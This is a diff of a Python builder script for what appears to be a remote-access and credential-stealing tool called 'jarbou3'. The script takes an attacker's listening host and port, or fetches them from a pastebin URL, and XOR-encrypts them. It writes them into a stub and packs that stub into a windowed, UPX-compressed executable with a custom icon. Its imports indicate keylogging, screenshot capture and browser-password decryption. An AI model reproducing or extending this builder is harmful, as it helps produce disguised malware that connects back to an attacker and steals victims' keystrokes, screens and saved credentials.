@@ -37,127 +37,130 @@ def replace_string(filename, old_string, new_string):
 
 
 
+def checkreqwin():
+    try:
+        import socket
+        import json
+        import subprocess
+        import os
+        import pyautogui
+        import threading
+        import shutil
+        import sys
+        from os.path import isfile
+        import random
+        import string
+        from requests import get
+        from webbrowser import open as op
+        import getpass
+        import ctypes
+        from pynput.keyboard import Listener
+        import time
+        import win32crypt
+        import sqlite3
+        import base64
+        from PIL import ImageGrab
+        from urllib.request import Request, urlopen
 
+        from cryptography.hazmat.backends import default_backend
+        from cryptography.hazmat.primitives.ciphers import (
+            Cipher, algorithms, modes)
+    except Exception as moderror:
+        print(moderror)
+        print('run installed.bat and restart the tool')
+        exit()
 
 
 def build():
     global key
-    if platform.system() == "Windows":
-        try:
-            import socket
-            import json
-            import subprocess
-            import os
-            import pyautogui
-            import threading
-            import shutil
-            import sys
-            from os.path import isfile
-            import random
-            import string
-            from requests import get
-            from webbrowser import open as op
-            import getpass
-            import ctypes
-            from pynput.keyboard import Listener
-            import time
-            import win32crypt
-            import sqlite3
-            import base64
-            from PIL import ImageGrab
-            from urllib.request import Request, urlopen
 
-            from cryptography.hazmat.backends import default_backend
-            from cryptography.hazmat.primitives.ciphers import (
-                Cipher, algorithms, modes)
-        except Exception as moderror:
-            print(moderror)
-            print('run installed.bat and restart the tool')
-            exit()
+    def genkey(length: int) -> bytes:
+        return os.urandom(length)
 
+    def xor_strings(s, t) -> bytes:
+        if isinstance(s, str):
+            # Text strings contain single characters
+            return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
+        else:
 
+            return bytes([a ^ b for a, b in zip(s, t)])
 
+    print("""
+    1) lhost and lport
+    2) grab host and port from pastebin ex:127.0.0.1:4444
+            """)
+    c = int(input('choose:'))
+    if c == 1:
 
-        def genkey(length: int) -> bytes:
-            return os.urandom(length)
+        lhost = input('entre your host:')
+        keyhost = genkey(len(lhost))
+        cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)
 
-        def xor_strings(s, t) -> bytes:
-            if isinstance(s, str):
-                # Text strings contain single characters
-                return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
-            else:
+        lport = input('entre lport:')
+        keyport = genkey(len(lport))
+        cryptedport = xor_strings(lport.encode('utf8'), keyport)
+        icon = ""
+        while isfile(icon) == False:
+            icon = input('entre your icon path:')
+        if platform.system() == "Windows":
+            os.system('powershell -c cd stub; cp jarbou3.py ..')
+        else:
+            os.system("cp -r stub/Jarbou3.py ..")
+        replace_string('jarbou3.py', '$lhost', str(cryptedhost))
+        replace_string('jarbou3.py', '$lport', str(cryptedport))
+        replace_string("jarbou3.py", "$hostkey", str(keyhost))
+        replace_string("jarbou3.py", "$portkey", str(keyport))
+        key = open('key.txt', 'r').read()
+        replace_string('jarbou3.py', '$key', key)
 
-                return bytes([a ^ b for a, b in zip(s, t)])
+        print('[+]Compiling')
+        if platform.system() == "Windows":
+            os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
+        else:
+            os.system(
+                'wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
 
-        print("""
-1) lhost and lport
-2) grab host and port from pastebin ex:127.0.0.1:4444
-        """)
-        c = int(input('choose:'))
-        if c == 1:
-
-            lhost = input('entre your host:')
-            keyhost = genkey(len(lhost))
-            cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)
-
-            lport = input('entre lport:')
-            keyport = genkey(len(lport))
-            cryptedport = xor_strings(lport.encode('utf8'), keyport)
-            icon = ""
+        if platform.system() == "Windows":
+            os.system('powershell -c cd dist; mv jarbou3.exe ..')
+            os.remove('jarbou3.py')
+        else:
+            os.system("cd dist && mv jarbou3.exe ..")
+            os.remove("jarbou3.py")
+    elif c == 2:
+        URL = input('entre you url:')
+        u = requests.get(URL).text
+        sp = u.split(':')
+        print('host is:' + sp[0] + '\n port is:' + sp[1])
+        if platform.system() == "Windows":
+            os.system('powershell -c cd stub; cp Jarbou3-pastebin.py ..')
+        else:
+            os.system("cp -r stub/Jarbou3-pastebin.py ..")
+        ask = input('is  those your host and port(y/n):')
+        if ask == 'y':
+            replace_string('jarbou3-pastebin.py', '$pastebin', URL)
+            replace_string('jarbou3.py', '$key', key)
+            icon = ''
             while isfile(icon) == False:
                 icon = input('entre your icon path:')
-            if platform.system() == "Windows":
-                os.system('powershell -c cd stub; cp jarbou3.py ..')
-            else:
-                os.system("cp -r stub/Jarbou3.py ..")
-            replace_string('jarbou3.py', '$lhost', str(cryptedhost))
-            replace_string('jarbou3.py', '$lport', str(cryptedport))
-            replace_string("jarbou3.py","$hostkey",str(keyhost))
-            replace_string("jarbou3.py","$portkey",str(keyport))
-            key = open('key.txt', 'r').read()
-            replace_string('jarbou3.py', '$key', key)
-
             print('[+]Compiling')
             if platform.system() == "Windows":
-                os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
+                os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
+                os.system('powershell -c cd dist; mv jarbou3-pastebin.exe ..')
             else:
-                os.system('wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
-
-            if platform.system() == "Windows":
-                os.system('powershell -c cd dist; mv jarbou3.exe ..')
-                os.remove('jarbou3.py')
-            else:
-                os.system("cd dist && mv jarbou3.exe ..")
-                os.remove("jarbou3.py")
-        elif c == 2:
-            URL = input('entre you url:')
-            u = requests.get(URL).text
-            sp = u.split(':')
-            print('host is:'+sp[0]+'\n port is:'+sp[1])
-            if platform.system() == "Windows":
-                os.system('powershell -c cd stub; cp Jarbou3-pastebin.py ..')
-            else:
-                os.system("cp -r stub/Jarbou3-pastebin.py ..")
-            ask = input('is  those your host and port(y/n):')
-            if ask == 'y':
-                replace_string('jarbou3-pastebin.py','$pastebin',URL)
-                replace_string('jarbou3.py', '$key', key)
-                icon = ''
-                while isfile(icon) == False:
-                    icon = input('entre your icon path:')
-                print('[+]Compiling')
-                if platform.system() == "Windows":
-                    os.system('pyinstaller --noconfirm --onefile --windowed --icon "' + icon + '"  "jarbou3-pastebin.py"')
-                    os.system('powershell -c cd dist; mv jarbou3-pastebin.exe ..')
-                else:
-                    os.system('wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3-pastebin.py"')
-                    os.system("cd dist && mv jarbou3-pastebin.exe ..")
-                os.remove("jarbou3-pastebin.py")
-            else:
-                os.remove('jarbou3-pastebin.py')
-                build()
+                os.system(
+                    'wine pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3-pastebin.py"')
+                os.system("cd dist && mv jarbou3-pastebin.exe ..")
+            os.remove("jarbou3-pastebin.py")
         else:
+            os.remove('jarbou3-pastebin.py')
             build()
+    else:
+        build()
+if platform.system() == "Windows":
+    checkreqwin()
+    build()
+else:
+    build()
 
 
 
